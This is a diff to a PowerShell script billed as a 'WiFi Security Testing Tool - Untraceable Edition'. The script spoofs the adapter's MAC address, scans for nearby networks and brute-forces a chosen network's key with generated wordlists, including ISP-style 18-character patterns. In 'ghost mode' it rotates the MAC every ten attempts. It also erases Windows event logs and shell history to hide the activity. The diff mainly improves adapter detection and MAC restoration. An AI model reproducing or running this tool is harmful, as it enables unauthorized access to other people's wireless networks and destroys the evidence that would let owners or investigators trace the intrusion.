@@ -1,10 +1,6 @@
 <#
 .SYNOPSIS
     WiFi Security Testing Tool - Untraceable Edition
-    
-.DESCRIPTION
-    Professional WiFi security testing tool with maximum security.
-    Supports: Windows, Ubuntu, Debian, RedHat, macOS, Linux
 #>
 
 [CmdletBinding()]
@@ -15,7 +11,6 @@ param(
     [int]$HexPasswordCount = 5000
 )
 
-# Force error handling
 $ErrorActionPreference = "Stop"
 $ProgressPreference = "Continue"
 
@@ -30,7 +25,6 @@ function Initialize-OSDetection {
     if ($env:OS -eq "Windows_NT" -or $IsWindows) {
         $Global:OS_TYPE = "Windows"
         $Global:OS_NAME = "Windows"
-        $Global:OS_VERSION = [System.Environment]::OSVersion.VersionString
         
         if ([System.Environment]::OSVersion.Version.Major -eq 10) {
             if ([System.Environment]::OSVersion.Version.Build -ge 22000) {
@@ -46,23 +40,10 @@ function Initialize-OSDetection {
         $Global:OS_TYPE = "Linux"
         
         if (Test-Path "/etc/os-release") {
-            $osInfo = @{}
-            Get-Content "/etc/os-release" | ForEach-Object {
-                if ($_ -match '^(.*?)=(.*)$') {
-                    $key = $matches[1]
-                    $value = $matches[2] -replace '"', ''
-                    $osInfo[$key] = $value
-                }
+            $content = Get-Content "/etc/os-release" -Raw
+            if ($content -match 'PRETTY_NAME="([^"]+)"') {
+                $Global:OS_NAME = $matches[1]
             }
-            
-            $Global:OS_NAME = $osInfo["NAME"]
-            if ($Global:OS_NAME -match "Ubuntu") { $Global:OS_NAME = "Ubuntu" }
-            elseif ($Global:OS_NAME -match "Debian") { $Global:OS_NAME = "Debian" }
-            elseif ($Global:OS_NAME -match "Red Hat|RHEL") { $Global:OS_NAME = "RedHat" }
-            elseif ($Global:OS_NAME -match "CentOS") { $Global:OS_NAME = "CentOS" }
-            elseif ($Global:OS_NAME -match "Fedora") { $Global:OS_NAME = "Fedora" }
-            elseif ($Global:OS_NAME -match "Kali") { $Global:OS_NAME = "Kali" }
-            else { $Global:OS_NAME = "Linux" }
         }
         return
     }
@@ -86,7 +67,6 @@ $Global:Config = @{
     StealthMode = ($Mode -eq "stealth" -or $Mode -eq "ghost")
     Interface = $null
     OriginalMac = $null
-    SessionKey = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object {[char]$_})
 }
 
 # ============================================
@@ -100,11 +80,9 @@ function Clear-SystemTraces {
             wevtutil cl System 2>$null
             wevtutil cl Application 2>$null
             ipconfig /flushdns | Out-Null
-            Clear-History 2>$null
         } 
         elseif ($Global:OS_TYPE -eq "Linux" -or $Global:OS_TYPE -eq "macOS") {
             Remove-Item ~/.bash_history -Force -ErrorAction SilentlyContinue 2>$null
-            history -c 2>$null
         }
     } catch {}
 }
@@ -114,24 +92,80 @@ function Get-NetworkAdapters {
     
     try {
         if ($Global:OS_TYPE -eq "Windows") {
-            Write-Host "[DEBUG] Detecting Windows adapters..." -ForegroundColor Gray
+            # Method 1: Get-NetAdapter
+            try {
+                $netAdapters = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { 
+                    $_.MediaType -match "802.11" -or 
+                    $_.InterfaceDescription -match "wireless|wifi|wi-fi|wlan" -or
+                    $_.Name -match "wifi|wi-fi|wlan|wireless"
+                }
+                
+                if ($netAdapters) {
+                    foreach ($adapter in $netAdapters) {
+                        $adapters += [PSCustomObject]@{
+                            Name = $adapter.Name
+                            Description = $adapter.InterfaceDescription
+                            Status = $adapter.Status
+                            MacAddress = $adapter.MacAddress
+                            GUID = $adapter.InterfaceGuid
+                        }
+                    }
+                }
+            } catch {}
             
-            $netAdapters = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { 
-                $_.MediaType -eq "Native 802.11" -or 
-                $_.MediaType -eq "802.11" -or
-                $_.InterfaceDescription -match "wireless|wifi|wi-fi|wlan"
+            # Method 2: netsh fallback - PARSING CORRIGÉ
+            if ($adapters.Count -eq 0) {
+                try {
+                    $netshOutput = netsh wlan show interfaces 2>&1 | Out-String
+                    if ($netshOutput -notmatch "There is no wireless" -and $netshOutput -notmatch "Aucune interface") {
+                        $lines = $netshOutput -split "`r?`n"
+                        
+                        for ($i = 0; $i -lt $lines.Count; $i++) {
+                            $line = $lines[$i]
+                            if ($line -match "^\s*Name\s*:\s*(.+)$" -or 
+                                $line -match "^\s*Nom\s*:\s*(.+)$" -or
+                                $line -match "^\s*Interface\s*:\s*(.+)$") {
+                                
+                                $interfaceName = $matches[1].Trim()
+                                
+                                if (-not [string]::IsNullOrWhiteSpace($interfaceName) -and $interfaceName -ne "Name" -and $interfaceName -ne "Nom") {
+                                    $adapters += [PSCustomObject]@{
+                                        Name = $interfaceName
+                                        Description = "Wireless Adapter (netsh)"
+                                        Status = "Unknown"
+                                        MacAddress = "Unknown"
+                                        GUID = "Unknown"
+                                    }
+                                    break
+                                }
+                            }
+                        }
+                    }
+                } catch {}
             }
             
-            Write-Host "[DEBUG] Found $($netAdapters.Count) potential adapters" -ForegroundColor Gray
-            
-            foreach ($adapter in $netAdapters) {
-                $adapters += [PSCustomObject]@{
-                    Name = $adapter.Name
-                    Description = $adapter.InterfaceDescription
-                    Status = $adapter.Status
-                    MacAddress = $adapter.MacAddress
-                    GUID = $adapter.InterfaceGuid
-                }
+            # Method 3: wmic fallback
+            if ($adapters.Count -eq 0) {
+                try {
+                    $wmicOutput = wmic nic where "NetConnectionID like '%Wireless%' or NetConnectionID like '%Wi-Fi%'" get NetConnectionID /value 2>$null | Out-String
+                    if ($wmicOutput) {
+                        $lines = $wmicOutput -split "`r?`n"
+                        foreach ($line in $lines) {
+                            if ($line -match "NetConnectionID=(.+)$") {
+                                $name = $matches[1].Trim()
+                                if (-not [string]::IsNullOrWhiteSpace($name)) {
+                                    $adapters += [PSCustomObject]@{
+                                        Name = $name
+                                        Description = "Wireless Adapter (wmic)"
+                                        Status = "Unknown"
+                                        MacAddress = "Unknown"
+                                        GUID = "Unknown"
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } catch {}
             }
         }
         elseif ($Global:OS_TYPE -eq "Linux") {
@@ -146,8 +180,15 @@ function Get-NetworkAdapters {
             }
             
             foreach ($iface in $interfaces) {
+                if ([string]::IsNullOrWhiteSpace($iface)) { continue }
+                
                 $mac = ""
-                try { $mac = (cat "/sys/class/net/$iface/address" 2>$null).Trim() } catch {}
+                try { 
+                    $macFile = "/sys/class/net/$iface/address"
+                    if (Test-Path $macFile) {
+                        $mac = (Get-Content $macFile -ErrorAction SilentlyContinue).Trim() 
+                    }
+                } catch {}
                 
                 $adapters += [PSCustomObject]@{
                     Name = $iface
@@ -159,66 +200,142 @@ function Get-NetworkAdapters {
             }
         }
         elseif ($Global:OS_TYPE -eq "macOS") {
-            $airport = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
-            if (Test-Path $airport) {
-                $adapters += [PSCustomObject]@{
-                    Name = "en0"
-                    Description = "Wi-Fi"
-                    Status = "Unknown"
-                    MacAddress = "Unknown"
-                    GUID = "en0"
-                }
+            $adapters += [PSCustomObject]@{
+                Name = "en0"
+                Description = "Wi-Fi"
+                Status = "Unknown"
+                MacAddress = ""
+                GUID = "en0"
             }
         }
     }
-    catch {
-        Write-Host "[ERROR] Adapter detection failed: $_" -ForegroundColor Red
+    catch {}
+    
+    if ($null -eq $adapters) {
+        $adapters = @()
     }
     
     return $adapters
 }
 
 function Set-RandomMac {
-    param([string]$Interface)
+    param(
+        [string]$Interface,
+        [string]$MacAddress = $null   # Si null => aléatoire ; sinon, valeur imposée (restauration)
+    )
+    
+    # Variable de statut : on ne fait JAMAIS de return dans un finally
+    $result = $false
     
     try {
-        $random = Get-Random
-        $bytes = [byte[]]::new(6)
-        (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
-        $bytes[0] = [byte](($bytes[0] -band 0xFE) -bor 0x02)
-        $newMac = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ":"
-        
         if ($Global:OS_TYPE -eq "Windows") {
-            Disable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue
-            Start-Sleep -Seconds 2
-            
-            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
-            $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue | Where-Object { 
-                $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
-                $props -and $props.NetCfgInstanceId -eq (Get-NetAdapter -Name $Interface).InterfaceGuid 
+            # Vérifie que la carte existe
+            $adapterBefore = Get-NetAdapter -Name $Interface -ErrorAction SilentlyContinue
+            if (-not $adapterBefore) {
+                Write-Host "  [WARN] Adapter '$Interface' introuvable" -ForegroundColor Yellow
+                return $false
             }
             
-            if ($subKeys) {
-                $targetKey = if ($subKeys -is [array]) { $subKeys[0].PSPath } else { $subKeys.PSPath }
-                Set-ItemProperty -Path $targetKey -Name "NetworkAddress" -Value $newMac.Replace(":", "") -Force -ErrorAction SilentlyContinue
+            $disabled = $false
+            $enableFailed = $false
+            
+            try {
+                # Désactivation avec ErrorAction Stop pour bien capturer l'échec
+                Disable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction Stop
+                $disabled = $true
+                Start-Sleep -Seconds 2
+                
+                # Calcul du MAC cible
+                if (-not $MacAddress) {
+                    $bytes = [byte[]]::new(6)
+                    (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
+                    $bytes[0] = [byte](($bytes[0] -band 0xFE) -bor 0x02)
+                    $MacAddress = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ":"
+                }
+                
+                # Modification du registre
+                $adapter = Get-NetAdapter -Name $Interface -ErrorAction SilentlyContinue
+                if ($adapter) {
+                    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
+                    $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue | Where-Object { 
+                        $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
+                        $props -and $props.NetCfgInstanceId -eq $adapter.InterfaceGuid 
+                    }
+                    
+                    if ($subKeys) {
+                        $targetKey = if ($subKeys -is [array]) { $subKeys[0].PSPath } else { $subKeys.PSPath }
+                        
+                        # Si on restaure un MAC vide/Unknown => on supprime la clé NetworkAddress
+                        if ([string]::IsNullOrWhiteSpace($MacAddress) -or $MacAddress -eq "Unknown") {
+                            Remove-ItemProperty -Path $targetKey -Name "NetworkAddress" -Force -ErrorAction SilentlyContinue
+                        } else {
+                            Set-ItemProperty -Path $targetKey -Name "NetworkAddress" `
+                                -Value $MacAddress.Replace(":", "") -Force -ErrorAction SilentlyContinue
+                        }
+                    }
+                }
+            }
+            finally {
+                # TOUJOURS réactiver, même en cas d'exception
+                # PAS de return ici : on met à jour $enableFailed à la place
+                if ($disabled) {
+                    try {
+                        Enable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction Stop
+                        Start-Sleep -Seconds 3
+                    } catch {
+                        Write-Host "  [ERROR] Impossible de réactiver la carte '$Interface': $_" -ForegroundColor Red
+                        $enableFailed = $true
+                    }
+                }
             }
             
-            Enable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue
-            Start-Sleep -Seconds 3
-            return $true
+            if ($enableFailed) {
+                return $false
+            }
+            
+            # Vérification post-enable
+            $adapterAfter = Get-NetAdapter -Name $Interface -ErrorAction SilentlyContinue
+            if ($adapterAfter -and $adapterAfter.Status -ne "Disabled") {
+                return $true
+            }
+            return $false
         }
         elseif ($Global:OS_TYPE -eq "Linux") {
             sudo ip link set $Interface down 2>$null
             Start-Sleep -Seconds 1
-            sudo ip link set $Interface address $newMac 2>$null
-            sudo ip link set $Interface up 2>$null
-            Start-Sleep -Seconds 2
+            
+            try {
+                if (-not $MacAddress -or $MacAddress -eq "Unknown") {
+                    $bytes = [byte[]]::new(6)
+                    (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
+                    $bytes[0] = [byte](($bytes[0] -band 0xFE) -bor 0x02)
+                    $MacAddress = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ":"
+                }
+                sudo ip link set $Interface address $MacAddress 2>$null
+            }
+            finally {
+                # PAS de return ici
+                sudo ip link set $Interface up 2>$null
+                Start-Sleep -Seconds 2
+            }
+            
+            return $true
+        }
+        elseif ($Global:OS_TYPE -eq "macOS") {
+            # macOS : MAC spoofing nécessite des outils tiers (spoof-mac)
             return $true
         }
     }
     catch {
+        Write-Host "  [ERROR] Set-RandomMac: $_" -ForegroundColor Red
+        # Tentative de secours : réactiver coûte que coûte
+        try { 
+            Enable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue 
+        } catch {}
         return $false
     }
+    
+    return $result
 }
 
 function Get-WifiNetworks {
@@ -226,7 +343,6 @@ function Get-WifiNetworks {
     
     try {
         if ($Global:OS_TYPE -eq "Windows") {
-            # Force scan
             for ($i = 0; $i -lt 2; $i++) {
                 netsh wlan scan interface="$($Global:Config.Interface)" 2>&1 | Out-Null
                 Start-Sleep -Seconds 2
@@ -437,7 +553,6 @@ function Get-CommonPasswords {
 function Get-18CharPatterns {
     $patterns = @()
     
-    # Orange/Vodacom patterns
     $prefixes = @("2TFG", "2TFH", "2TFJ", "3AFG", "2UFG", "A4B8", "001F", "0024")
     $middles = @("3AQ7", "3AR7", "3BQ7", "4AQ7", "3AP7", "3AQ8")
     $centers = @("2NZH", "2NZJ", "2NYH", "3NZH", "2NZG", "2MZH")
@@ -456,7 +571,6 @@ function Get-18CharPatterns {
         }
     }
     
-    # Random hex
     $hex = "0123456789ABCDEF"
     for ($i = 0; $i -lt 1000; $i++) {
         $pass = -join ((1..18) | ForEach-Object { $hex[(Get-Random -Maximum 16)] })
@@ -476,7 +590,6 @@ function Start-Test {
     try {
         Clear-SystemTraces
         
-        # Header - ASCII only
         Write-Host ""
         Write-Host "===============================================================" -ForegroundColor Cyan
         Write-Host "    WiFi Security Testing Tool - Untraceable Edition" -ForegroundColor Cyan
@@ -501,66 +614,125 @@ function Start-Test {
             return
         }
         
-        # Get adapters
+        # ============================================
+        # GET WIFI ADAPTERS
+        # ============================================
         Write-Host "[INFO] Detecting network adapters..." -ForegroundColor Yellow
-        $adapters = Get-NetworkAdapters
         
-        Write-Host "[DEBUG] Found $($adapters.Count) adapters" -ForegroundColor Gray
+        $adapters = @(Get-NetworkAdapters)
         
         if ($adapters.Count -eq 0) {
-            Write-Host "[ERROR] No wireless adapters found" -ForegroundColor Red
-            Write-Host "[INFO] Make sure WiFi is enabled and drivers are installed" -ForegroundColor Yellow
-            return
+            Write-Host ""
+            Write-Host "[ERROR] No wireless adapters detected!" -ForegroundColor Red
+            Write-Host ""
+            Write-Host "[DEBUG] Windows network adapters:" -ForegroundColor Yellow
+            
+            try {
+                Get-NetAdapter |
+                    Select-Object Name, InterfaceDescription, Status, MediaType |
+                    Format-Table -AutoSize
+            }
+            catch {
+                Write-Host "[ERROR] Unable to query Get-NetAdapter." -ForegroundColor Red
+            }
+            
+            Write-Host ""
+            Write-Host "[INFO] Check that:" -ForegroundColor Yellow
+            Write-Host "  - Wi-Fi is enabled"
+            Write-Host "  - The Wi-Fi driver is installed"
+            Write-Host "  - Windows recognizes the wireless adapter"
+            Write-Host ""
+            
+            $manualName = Read-Host "Enter WiFi interface name (e.g., 'Wi-Fi' or 'wlan0') or press Enter to exit"
+            
+            if ([string]::IsNullOrWhiteSpace($manualName)) {
+                Write-Host "[EXIT] No adapter selected. Exiting." -ForegroundColor Yellow
+                return
+            }
+            
+            $adapters = @([PSCustomObject]@{
+                Name = $manualName
+                Description = "Manual Entry"
+                Status = "Unknown"
+                MacAddress = "Unknown"
+                GUID = "Manual"
+            })
         }
         
-        Write-Host "`n[ADAPTERS] Available wireless adapters:" -ForegroundColor Cyan
+        Write-Host ""
+        Write-Host "[ADAPTERS] Found $($adapters.Count) wireless adapter(s):" -ForegroundColor Cyan
+        
         for ($i = 0; $i -lt $adapters.Count; $i++) {
-            $statusColor = if ($adapters[$i].Status -eq "Up") { "Green" } else { "Yellow" }
-            Write-Host "  [$i] $($adapters[$i].Name)" -ForegroundColor White -NoNewline
-            Write-Host " - $($adapters[$i].Description) " -NoNewline
-            Write-Host "[$($adapters[$i].Status)]" -ForegroundColor $statusColor
+            $adapter = $adapters[$i]
+            
+            $statusColor = if ($adapter.Status -eq "Up") {
+                "Green"
+            } else {
+                "Yellow"
+            }
+            
+            Write-Host "  [$i] $($adapter.Name)" -ForegroundColor White -NoNewline
+            
+            if ($adapter.Description -and $adapter.Description -ne "Manual Entry") {
+                Write-Host " - $($adapter.Description)" -ForegroundColor Gray -NoNewline
+            }
+            
+            Write-Host " [$($adapter.Status)]" -ForegroundColor $statusColor
         }
         
-        # Selection with validation
+        # ============================================
+        # ADAPTER SELECTION
+        # ============================================
+        
         $validSelection = $false
         $selectedIndex = -1
+        $maxIndex = [math]::Max(0, $adapters.Count - 1)
         
         do {
-            $sel = Read-Host "`nSelect adapter number (0-$($adapters.Count - 1))"
+            Write-Host ""
+            $sel = Read-Host "Select adapter number (0-$maxIndex)"
             
-            # Validate input is a number
             if ($sel -match '^\d+$') {
-                $selectedIndex = [int]$sel
-                if ($selectedIndex -ge 0 -and $selectedIndex -lt $adapters.Count) {
+                $candidate = [int]$sel
+                if ($candidate -ge 0 -and $candidate -lt $adapters.Count) {
+                    $selectedIndex = $candidate
                     $validSelection = $true
-                } else {
-                    Write-Host "[ERROR] Number out of range. Please enter 0-$($adapters.Count - 1)" -ForegroundColor Red
                 }
-            } else {
-                Write-Host "[ERROR] Invalid input. Please enter a number." -ForegroundColor Red
+                else {
+                    Write-Host "[ERROR] Number must be between 0 and $maxIndex" -ForegroundColor Red
+                }
+            }
+            else {
+                Write-Host "[ERROR] Please enter a number." -ForegroundColor Red
             }
         } while (-not $validSelection)
         
         $adapter = $adapters[$selectedIndex]
+        
         $Global:Config.Interface = $adapter.Name
         $Global:Config.OriginalMac = $adapter.MacAddress
         
-        Write-Host "`n[SELECTED] $($adapter.Name)" -ForegroundColor Green
+        Write-Host ""
+        Write-Host "[SELECTED] Using adapter: $($adapter.Name)" -ForegroundColor Green
         
-        # Change MAC
+        # ============================================
+        # CHANGE MAC
+        # ============================================
         Write-Host "`n[ANON] Changing MAC address..." -ForegroundColor Cyan
         if (Set-RandomMac -Interface $adapter.Name) {
             Write-Host "  [OK] MAC changed successfully" -ForegroundColor Green
         } else {
-            Write-Host "  [WARN] MAC change failed, continuing with original..." -ForegroundColor Yellow
+            Write-Host "  [WARN] MAC change failed, continuing..." -ForegroundColor Yellow
         }
         
-        # Scan
+        # ============================================
+        # SCAN
+        # ============================================
         Write-Host "`n[SCAN] Scanning for WiFi networks..." -ForegroundColor Yellow
         $networks = Get-WifiNetworks
         
         if ($networks.Count -eq 0) {
-            Write-Host "[ERROR] No networks found. Make sure WiFi is enabled." -ForegroundColor Red
+            Write-Host "[ERROR] No networks found" -ForegroundColor Red
             return
         }
         
@@ -574,19 +746,23 @@ function Start-Test {
             Write-Host ", Security: $($networks[$i].Security))"
         }
         
-        # Target selection with validation
+        # ============================================
+        # TARGET SELECTION
+        # ============================================
         $validTarget = $false
         $targetIndex = -1
+        $maxNetwork = [math]::Max(0, $networks.Count - 1)
         
         do {
-            $sel = Read-Host "`nSelect target network (0-$($networks.Count - 1))"
+            Write-Host ""
+            $sel = Read-Host "Select target network (0-$maxNetwork)"
             
             if ($sel -match '^\d+$') {
                 $targetIndex = [int]$sel
                 if ($targetIndex -ge 0 -and $targetIndex -lt $networks.Count) {
                     $validTarget = $true
                 } else {
-                    Write-Host "[ERROR] Number out of range" -ForegroundColor Red
+                    Write-Host "[ERROR] Number must be between 0 and $maxNetwork" -ForegroundColor Red
                 }
             } else {
                 Write-Host "[ERROR] Invalid input. Please enter a number." -ForegroundColor Red
@@ -594,9 +770,11 @@ function Start-Test {
         } while (-not $validTarget)
         
         $target = $networks[$targetIndex]
-        Write-Host "`n[TARGET] $($target.SSID)" -ForegroundColor Cyan
+        Write-Host "`n[TARGET] Selected: $($target.SSID)" -ForegroundColor Cyan
         
-        # Generate passwords
+        # ============================================
+        # GENERATE PASSWORDS
+        # ============================================
         Write-Host "`n[GENERATING] Creating password lists..." -ForegroundColor Yellow
         
         Write-Host "  [1/3] SSID-based passwords..." -ForegroundColor Gray
@@ -608,7 +786,6 @@ function Start-Test {
         Write-Host "  [3/3] 18-character patterns..." -ForegroundColor Gray
         $p3 = Get-18CharPatterns
         
-        # Combine
         $allPasswords = @()
         $allPasswords += $p1
         $allPasswords += $p2 | Where-Object { $_ -notin $allPasswords }
@@ -618,7 +795,9 @@ function Start-Test {
         Write-Host "[INFO] Order: 1) SSID-based, 2) Common, 3) 18-char patterns" -ForegroundColor Gray
         Write-Host "[INFO] Press 'Q' to stop, 'R' to rotate MAC`n" -ForegroundColor Yellow
         
-        # Test loop
+        # ============================================
+        # TEST LOOP
+        # ============================================
         $startTime = Get-Date
         $tested = 0
         $phase = "PHASE 1/3"
@@ -628,7 +807,6 @@ function Start-Test {
             $password = $allPasswords[$i]
             $tested++
             
-            # Determine phase
             if ($i -eq $p1.Count) { 
                 $phase = "PHASE 2/3"
                 $phaseName = "COMMON"
@@ -640,13 +818,11 @@ function Start-Test {
                 Write-Host "`n[$phase] Testing 18-character patterns..." -ForegroundColor Cyan
             }
             
-            # Progress
             if ($i % 5 -eq 0 -or $i -eq 0) {
                 $percent = [math]::Min(($i / $allPasswords.Count) * 100, 100)
                 Write-Progress -Activity "[$phaseName] Testing passwords" -Status $password -PercentComplete $percent
             }
             
-            # Key check
             if ([Console]::KeyAvailable) {
                 $key = [Console]::ReadKey($true)
                 if ($key.Key -eq 'Q') { 
@@ -659,12 +835,10 @@ function Start-Test {
                 }
             }
             
-            # Rotate MAC every 10 in ghost mode
             if ($Global:Config.GhostMode -and ($tested % 10 -eq 0) -and ($tested -gt 0)) {
                 Set-RandomMac -Interface $Global:Config.Interface | Out-Null
             }
             
-            # Test
             $success = Test-Password -SSID $target.SSID -Password $password -Interface $Global:Config.Interface
             
             if ($success) {
@@ -679,21 +853,13 @@ function Start-Test {
                 Write-Host "  Tested: $tested of $($allPasswords.Count)" -ForegroundColor Gray
                 Write-Host "========================================== [SUCCESS]" -ForegroundColor Green
                 
-                # Cleanup
-                Clear-SystemTraces
-                Set-RandomMac -Interface $Global:Config.Interface | Out-Null
-                
+                # Le finally s'occupera de la restauration
                 return
             }
         }
         
-        # Not found
         Write-Host "`n[RESULT] Password not found" -ForegroundColor Red
         Write-Host "  Total tested: $($allPasswords.Count) passwords" -ForegroundColor Gray
-        
-        # Cleanup
-        Clear-SystemTraces
-        Set-RandomMac -Interface $Global:Config.Interface | Out-Null
         
     }
     catch {
@@ -701,10 +867,32 @@ function Start-Test {
         Write-Host $_.ScriptStackTrace -ForegroundColor Gray
     }
     finally {
-        # Emergency cleanup
+        # ============================================
+        # RESTAURATION FINALE
+        # ============================================
         Clear-SystemTraces
-        if ($Global:Config.Interface) {
-            Set-RandomMac -Interface $Global:Config.Interface | Out-Null
+        
+        if ($Global:Config.Interface -and $Global:Config.OriginalMac) {
+            Write-Host "`n[RESTORE] Restauration du MAC original ($($Global:Config.OriginalMac))..." -ForegroundColor Cyan
+            
+            $ok = Set-RandomMac -Interface $Global:Config.Interface -MacAddress $Global:Config.OriginalMac
+            
+            if ($ok) {
+                Write-Host "  [OK] MAC restauré et carte réactivée" -ForegroundColor Green
+            } else {
+                Write-Host "  [WARN] Restauration MAC échouée, tentative de réactivation seule..." -ForegroundColor Yellow
+                try {
+                    Enable-NetAdapter -Name $Global:Config.Interface -Confirm:$false -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        }
+        elseif ($Global:Config.Interface) {
+            # Pas de MAC original connu => au moins réactiver
+            Write-Host "`n[RESTORE] Réactivation de la carte..." -ForegroundColor Cyan
+            try {
+                Enable-NetAdapter -Name $Global:Config.Interface -Confirm:$false -ErrorAction SilentlyContinue
+                Write-Host "  [OK] Carte réactivée" -ForegroundColor Green
+            } catch {}
         }
         
         Write-Host "`n[DONE] Press any key to exit..." -ForegroundColor Cyan
@@ -712,7 +900,6 @@ function Start-Test {
     }
 }
 
-# Set priority and start
 try {
     $proc = Get-Process -Id $PID
     $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
